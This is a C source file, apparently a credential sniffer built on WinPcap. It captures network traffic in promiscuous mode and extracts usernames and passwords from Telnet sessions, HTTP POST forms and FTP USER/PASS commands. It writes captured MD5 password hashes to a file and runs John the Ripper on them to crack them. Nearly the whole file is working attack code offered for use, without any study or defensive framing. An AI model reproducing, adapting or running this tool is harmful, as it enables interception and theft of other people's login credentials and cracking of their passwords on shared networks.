

// needed for compilation of pcap.h
#define HAVE_REMOTE

// constants
#define S_MAX_BUF    10000
#define PORT_TELNET  23
#define PORT_HTTP    80
#define PORT_FTP     21
#define H_ETH        14

#include "pcap.h"


typedef struct ip_addr{
    u_char byte_1;
    u_char byte_2;
    u_char byte_3;
    u_char byte_4;
}ip_addr;


typedef struct ip_head{
    u_char  ver_and_headLen;
    u_char  type_of_serv;
    u_short total_len;
    u_short id;
    u_short flags_and_fragOffset;
    u_char  ttl;
    u_char  protocol;
    u_short chksum;
    ip_addr srcaddr;
    ip_addr destaddr;
    u_int   options;
}ip_head;

typedef struct tcp_head{
    u_short sport;
    u_short dport;
    u_int   seq;
    u_int   ackn;
    u_char  ns :1;
    u_char  res_part:3;
    u_char  dataOffset:4;
    u_char  fin :1;
    u_char  syn :1;
    u_char  rst :1;
    u_char  psh :1;
    u_char  ack :1;
    u_char  urg :1;
    u_char  ecn :1;
    u_char  cwr :1;
    u_short wind;
    u_short chksum;
    u_short urgPointer;
}tcp_head;

void print_ip_address(ip_addr ip);
void get_http_value(u_char *http_head, u_short headerLen, u_char *key, u_short keyLen, u_short tcpHeadLen, u_short ipHeadLen);
void process_telnet_from_server(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen);
void process_telnet_from_client(const u_short headerLen, const u_char *packetData, u_short tcpHeadLen, u_short ipHeadLen);
void process_http_from_client(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen);
void process_ftp_from_client(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen);
void pkt_callback(u_char *parameters, const struct pcap_pkthdr *pkthead, const u_char *pktdata);

char capture_telnet = 0;
char data_buf[S_MAX_BUF];
char user_name[S_MAX_BUF];

int main()
{
    pcap_if_t *devices;
    pcap_if_t *single_dev;
    pcap_t    *dev_handle;

    int       devnum;
    char      errorstring[PCAP_ERRBUF_SIZE];
    struct    bpf_program bpf_prog;
    u_int     netmask;

    int       num = 1;
    char      filter[] = "ip and tcp";

    // Get list of devices
    if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &devices, errorstring) == -1)
    {
        fprintf(stderr,"Got error when finding devices: %s", errorstring);
        exit(1);
    }

    // Display choices of devices
    for(single_dev = devices; single_dev; single_dev = single_dev->next)
    {
        printf("> %d - %s", num, single_dev->name);
        if (single_dev->description)
        {
            printf(" - %s\n", single_dev->description);
        }
        else
        {
            printf(" - ?\n");
        }

        num++;
    }

    // if num == 0 , then no devices were found
    if(num==0)
    {
        printf("\nFound no devices!\n");
        return -1;
    }

    printf("\n    Choose capture interface number:");
    scanf_s("%d", &devnum);

    if((1 <= devnum) && (devnum <= num))
    {
        single_dev = devices;
        for(num = 1; num < devnum; num++)
        {
            single_dev = single_dev->next;
        }

        printf("\n\nCapturing %s\n", single_dev->name);
        printf("          %s\n", single_dev->description);
    }
    else
    {
        printf("\nInvalid interface\n");
        pcap_freealldevs(devices);
        return -1;
    }

    // open the handle to interface
    if ((dev_handle= pcap_open(single_dev->name,
                     65536,
                     PCAP_OPENFLAG_PROMISCUOUS,
                     1000,
                     NULL,
                     errorstring)
        ) == NULL)
    {
        fprintf(stderr,"\nError when opening interface handle");
        pcap_freealldevs(devices);
        return -1;
    }

    // obtain the netmask
    netmask=((struct sockaddr_in *)(single_dev->addresses->netmask))->sin_addr.S_un.S_addr;

    //compile the packet filter
    if (pcap_compile(dev_handle, &bpf_prog, filter, 1, netmask) <0 )
    {
        fprintf(stderr,"\nError compiling the packet filter");
        pcap_freealldevs(devices);
        return -1;
    }

    //put the packet filter into effect
    if (pcap_setfilter(dev_handle, &bpf_prog) <0 )
    {
        fprintf(stderr,"\nError when setting the packet filter");
        pcap_freealldevs(devices);
        return -1;
    }

    // we got our device so free the device list
    pcap_freealldevs(devices);
    // start polling for packets
    pcap_loop(dev_handle, 0, pkt_callback, NULL);

    return 0;
}

// the polling function that is called for every captured packet
void pkt_callback(u_char *parameters, const struct pcap_pkthdr *pkthead, const u_char *pktdata)
{
    ip_head  *ih;
    tcp_head *tcp_h;
    u_int    ipHeadLen;
    u_short  srcport, destport;
    u_short  tcpHeadLen;

    // get ip header position
    ih = (ip_head *) (pktdata + H_ETH);

    // get the ip header length
    ipHeadLen = (ih->ver_and_headLen & 0xf) * 4;

    // get tcp header position
    tcp_h = (tcp_head *) ((u_char*)pktdata + H_ETH + ipHeadLen);

    // get the tcp header length
    tcpHeadLen = tcp_h->dataOffset * 4;

    // get the ports in human readable form
    srcport  = ntohs( tcp_h->sport );
    destport = ntohs( tcp_h->dport );

    // process packets depending on the port number and packet destination
    if (srcport == PORT_TELNET)
    {
        process_telnet_from_server(pkthead->len, pktdata, ih->srcaddr, tcpHeadLen, ipHeadLen);
    }

    if (destport == PORT_TELNET)
    {
        process_telnet_from_client(pkthead->len, pktdata, tcpHeadLen, ipHeadLen);
    }

    if (destport == PORT_HTTP)
    {
        process_http_from_client(pkthead->len, pktdata, ih->destaddr, tcpHeadLen, ipHeadLen);
    }

    if (destport == PORT_FTP)
    {
        process_ftp_from_client(pkthead->len, pktdata, ih->destaddr, tcpHeadLen, ipHeadLen);
    }
}

// print ip address
void print_ip_address(ip_addr ip)
{
    printf("%d.%d.%d.%d", ip.byte_1, ip.byte_2, ip.byte_3, ip.byte_4);
}

// get the value in the key value pair in http data
u_char get_http_value(u_char *http_head, u_short headerLen, u_char *key, u_short keyLen, u_short tcpHeadLen, u_short ipHeadLen)
{
    u_char  keymatched = 0;
    u_short offset = 0;
    u_short absPkt_offset;
    u_short buf_pos;

    memset(data_buf, 0 , S_MAX_BUF);

    // ensure we are within the http data
    while ((offset + H_ETH + ipHeadLen + tcpHeadLen) < (headerLen - keyLen - 1))
    {
        // if key is found
        if (strncmp(http_head + offset, key, keyLen) == 0)
        {
            absPkt_offset = offset + H_ETH + ipHeadLen + tcpHeadLen + keyLen;
            buf_pos = 0;

            // while still within http data
            while (absPkt_offset < headerLen)
            {
                // get the value character by character
                data_buf[buf_pos] = *(http_head + offset + keyLen + buf_pos);
                keymatched = 1;

                // if character is &, then this marks end of value string
                if (data_buf[buf_pos] == '&')
                {
                    // null terminate c-string
                    data_buf[buf_pos] = '\0';
                    break;
                }

                absPkt_offset = absPkt_offset + 1;
                buf_pos       = buf_pos       + 1;
            }
        }

        offset = offset + 1;
    }

    return keymatched;
}

// process telnet prompts from sever
void process_telnet_from_server(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen)
{
    u_char *telnet_head;

    // if header length is big enough to contain server login message
    if (headerLen > H_ETH + ipHeadLen + tcpHeadLen + 1)
    {
        // start position of telnet data
        telnet_head = (u_char*) (packetData + H_ETH + ipHeadLen + tcpHeadLen);

        // if not currently capturing username/password
        if (capture_telnet == 0)
        {
            if ((strncmp(telnet_head, "L", 1) == 0) ||
                (strncmp(telnet_head, "l", 1) == 0))
            {
                // got the "L" or "l" in "login"
                // user input will be username letters after this point
                printf("\n----------------------------------------\n");
                printf("TELNET/Server IP: ");
                print_ip_address(ip);
                printf("\nTELNET/Username Capture\n");
                printf("   Username: ");
                capture_telnet = 1;
            }
            else if ((strncmp(telnet_head, "P", 1) == 0) ||
                     (strncmp(telnet_head, "p", 1) == 0))
            {
                // got the "P" or "p" in "password"
                // user input will be password letters after this point
                printf("TELNET/Password Capture!\n");
                printf("   Password: ");
                capture_telnet = 1;
            }
        }
    }
}

// process telnet username/password input from client
void process_telnet_from_client(const u_short headerLen, const u_char *packetData, u_short tcpHeadLen, u_short ipHeadLen)
{
    u_char *telnet_head;

    // if true that server has sent login prompts
    if (capture_telnet == 1)
    {
        // start position of telnet data
        telnet_head = (packetData + H_ETH + ipHeadLen + tcpHeadLen);

        // headerlen is exactly this for usernname/password packets from client
        if (headerLen == H_ETH + ipHeadLen + tcpHeadLen + 1)
        {
            // if not carriage return character
            if (*telnet_head != 0x0d)
            {
                // print actual username/password letter in this packet
                printf("%c", *telnet_head);
            }
        }
        else if (headerLen == H_ETH + ipHeadLen + tcpHeadLen + 2)
        {
            // headerlen is exactly this for last packet containing carriage return
            if (*telnet_head == 0x0d)
            {
                // got correct header length,
                // and got carriage return (0x0d), so
                // user is done inputting username/password
                printf("\n*** END Capture ***\n\n");
                capture_telnet = 0;
            }
        }
    }
}

// process http username/password input from client
void process_http_from_client(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen)
{
    u_char *http_head;
    FILE   *pFile;

    // points to start of HTTP data
    http_head = (u_char*) (packetData + H_ETH + ipHeadLen + tcpHeadLen);

    // POST packets may have username/password
    if (strncmp(http_head, "POST", sizeof("POST") - 1) == 0)
    {
        // ensure to check "name=" before checking "user="
        // get_http_value searches for the key in http data, and sets the value in data_buf

        if (get_http_value(http_head, headerLen, "name=", sizeof("name=") - 1, tcpHeadLen, ipHeadLen))
        {
            printf("\n----------------------------------------\n");
            printf("HTTP/Server IP: ");
            print_ip_address(ip);
            printf("\nHTTP/Username: %s\n", data_buf);
            strncpy(user_name, data_buf, S_MAX_BUF);
        }
        else if (get_http_value(http_head, headerLen, "user=", sizeof("user=") - 1, tcpHeadLen, ipHeadLen))
        {
            printf("\n----------------------------------------\n");
            printf("HTTP/Server IP: ");
            print_ip_address(ip);
            printf("\nHTTP/Username: %s\n", data_buf);
            strncpy(user_name, data_buf, S_MAX_BUF);
        }

        if (get_http_value(http_head, headerLen, "md5password=", sizeof("md5password=") - 1, tcpHeadLen, ipHeadLen))
        {
            printf("HTTP/Password hash: %s\n\n", data_buf);

            // open a file to outut the usernmae/md5password hash
            pFile = fopen("john\\run\\hash.txt", "w");
            if (pFile != NULL)
            {
                char strFullHashFormat[S_MAX_BUF + 1];

                // put username:password_hash into the file
                strncpy(strFullHashFormat, user_name, S_MAX_BUF/2);
                strncat(strFullHashFormat, ":", 1);
                strncat(strFullHashFormat, data_buf, S_MAX_BUF/2);

                fputs(strFullHashFormat, pFile);
                fclose(pFile);

                // system call to john the ripper to decrypt md5 password
                system("\"john\\run\\john.exe\" john/run/hash.txt --format=raw-md5");
            }
        }
        else if (get_http_value(http_head, headerLen, "pass=", sizeof("pass=") - 1, tcpHeadLen, ipHeadLen))
        {
            // print the non md5 password to screen
            printf("HTTP/Password: %s\n", data_buf);
        }
    }
}

// process ftp username/password input from client
void process_ftp_from_client(const u_short headerLen, const u_char *packetData, ip_addr ip, u_short tcpHeadLen, u_short ipHeadLen)
{
    u_char *ftp_head;
    u_short offset;

    // points to start of FTP data
    ftp_head = (packetData + H_ETH + ipHeadLen + tcpHeadLen);

    offset = 0;

    // if found the key USER
    if (strncmp(ftp_head, "USER", sizeof("USER") - 1) == 0)
    {
        printf("\n----------------------------------------\n");
        printf("FTP/Server IP: ");
        print_ip_address(ip);
        printf("\nFTP/");

        // grab the rest of the message and print the actual username
        while (offset + H_ETH + ipHeadLen + tcpHeadLen < headerLen)
        {
            printf("%c", *(ftp_head + offset));
            offset = offset + 1;
        }
    }

    offset = 0;

    // if found the key PASS
    if (strncmp(ftp_head, "PASS", sizeof("PASS") - 1) == 0)
    {
        printf("FTP/");

        // grab the rest of the message and print the actual password
        while (offset + H_ETH + ipHeadLen + tcpHeadLen < headerLen)
        {
            printf("%c", *(ftp_head + offset));
            offset = offset + 1;
        }

        printf("\n");
    }
}